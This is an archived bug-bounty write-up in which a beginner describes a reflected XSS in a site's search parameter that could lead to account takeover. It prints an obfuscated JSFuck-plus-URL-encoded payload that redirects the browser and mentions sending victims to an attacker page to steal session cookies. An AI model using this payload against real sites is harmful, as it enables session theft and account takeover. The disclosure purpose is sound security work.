# Reflected XSS Leading to Account Takeover

- **Source URL:** https://0onoproblem.medium.com/reflected-xss-leading-to-account-takeover-bea862cba885?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250321001308/https://0onoproblem.medium.com/reflected-xss-leading-to-account-takeover-bea862cba885?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6178 (id 6178)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Reflected XSS Leading to Account Takeover

## Hello everyone,

I’m 0\_oNoProblem (pronounced “Zero o NoProblem”, you can call me No or Nopr). I recently discovered my first bug, a reflected Cross-Site Scripting (XSS) vulnerability. I’m excited to share my experience with the community as a beginner in security research.

I will refer to the web app as example.com since it isn’t fixed yet.

Steps to Reproduce:Navigate to the search page: [https://www.example.com/search/?query=](https://web.archive.org/web/20250321001308/https://www.example.com/search/?query=)

In the query parameter, insert this JavaScript payload:

(%5B%5D%2B%5B%5D)%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(%5B%5D%5B%5B%5D%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D%5B(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%5D)%5B%2B!%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%5D()%5B%2B!%2B%5B%5D%2B%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%5D\<script>location.href=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 103, 111, 111, 103, 108, 101, 46, 99, 111, 109)\</script>


This payload redirect the user to google.com the attacker can change it to his site.

To craft this payload, I used JSFuck [https://jsfuck.com/](https://web.archive.org/web/20250321001308/https://jsfuck.com/) to encode a double quotation mark and then URL-encoded it.

I verified the XSS vulnerability by using an alert payload. To escalate the issue, I created a payload that redirects the user to an attacker-controlled page to steal cookies. This can lead to an Account Takeover (ATO) by capturing the user session.

I understand this might be considered a low-hanging fruit, but as someone who just started, finding and reporting this vulnerability was a significant milestone for me. I’m thrilled to have identified my first bug and hope to continue learning and growing in the field of security research. little fact i got duplicated but still happy finding it.

Thank you for taking the time to read my write-up!

Best regards, 0\_oNoProblem
